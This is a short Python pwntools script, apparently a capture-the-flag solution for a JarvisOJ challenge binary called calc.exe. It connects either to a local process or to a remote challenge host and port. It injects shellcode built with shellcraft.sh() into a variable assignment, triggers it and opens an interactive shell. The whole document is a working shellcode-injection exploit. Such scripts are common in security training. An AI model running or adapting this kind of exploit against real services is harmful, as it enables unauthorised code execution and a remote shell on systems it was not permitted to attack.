#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./calc.exe"

if sys.argv[1] == "l":
    io = process("./calc.exe")
else:
    io = remote('pwn2.jarvisoj.com', 9892)

io.sendlineafter("> ", "var add = \"{}\"".format(asm(shellcraft.sh())))
io.sendline('+')

io.interactive()
